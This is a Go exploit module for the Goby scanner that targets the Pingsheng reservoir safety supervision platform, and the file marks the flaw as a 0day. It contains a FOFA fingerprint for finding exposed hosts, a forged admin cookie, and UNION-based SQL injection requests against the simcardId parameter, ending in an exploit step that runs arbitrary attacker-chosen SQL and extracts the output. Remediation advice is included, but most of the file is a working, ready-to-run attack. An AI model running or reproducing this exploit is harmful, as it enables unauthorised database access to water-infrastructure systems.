package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SQL injection vulnerability exists in Pingsheng electronic reservoir safety supervision platform SIMMaintainService.asmx",
    "Description": "<p>Tangshan Pingsheng Electronic Technology Development Co., Ltd. was established in 1999, focusing on the R&amp;D and manufacturing of intelligent devices for the Internet of Things and the development of application software. The products developed are widely used in water affairs, environmental protection, agriculture, security, transportation, meteorology, energy and other fields. The simcardId parameter in the company's reservoir security supervision platform /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId has a hard coded SQL injection vulnerability that can ultimately lead to authentication, through which an attacker can obtain database permissions.</p>",
    "Product": "Reservoir safety supervision platform",
    "Homepage": "https://www.data86.net/xxskaqglpt.html",
    "DisclosureDate": "2022-11-30",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"js/PSExtend.js\"",
    "GobyQuery": "body=\"js/PSExtend.js\"",
    "Level": "3",
    "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server or directly execute SQL commands under high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, etc.) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"https://www.data86.net/category/product\">https://www.data86.net/category/product</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user,@@version,db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "currentuser=username=admin; usercookiename=usernames=admin;"
                },
                "data_type": "text",
                "data": "loginIdentifer=123&simcardId=123'+UNION+ALL+SELECT+1,1,1,1,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32),1--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "currentuser=username=admin; usercookiename=usernames=admin;"
                },
                "data_type": "text",
                "data": "loginIdentifer=123&simcardId=123'+UNION+ALL+SELECT+1,1,1,1,{{{sql}}},1--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|充值人\\\"\\:\\\"(.*?)\\\""
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "平升电子水库安全监管平台 SIMMaintainService.asmx存在SQL注入漏洞",
            "Product": "水库安全监管平台",
            "Description": "<p>唐山平升电子技术开发有限公司成立于1999年，专注于物联网智能设备研发制造和应用软件开发。开发的产品广泛服务于水务、环保、农业、安防、交通、气象、能源等领域。该公司的水库安全监管平台 /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId处simcardId参数存在硬编码可获取认证最终导致的SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>1、使用预编译语句，所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</span><br></p><p>2、对进入数据库的特殊字符（'\"@&amp;*;等）进行转义处理，或编码转换。</p><p>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>4、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><p>5、请关注厂商主页及时更新：<a href=\"https://www.data86.net/category/product\">https://www.data86.net/category/product</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马或直接利用SQL命令执行，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SQL injection vulnerability exists in Pingsheng electronic reservoir safety supervision platform SIMMaintainService.asmx",
            "Product": "Reservoir safety supervision platform",
            "Description": "<p>Tangshan Pingsheng Electronic Technology Development Co., Ltd. was established in 1999, focusing on the R&amp;D and manufacturing of intelligent devices for the Internet of Things and the development of application software. The products developed are widely used in water affairs, environmental protection, agriculture, security, transportation, meteorology, energy and other fields. The simcardId parameter in the company's reservoir security supervision platform /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId has a hard coded SQL injection vulnerability that can ultimately lead to authentication, through which an attacker can obtain database permissions.<br></p>",
            "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, etc.) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"https://www.data86.net/category/product\">https://www.data86.net/category/product</a></p>",
            "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server or directly execute SQL commands under high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}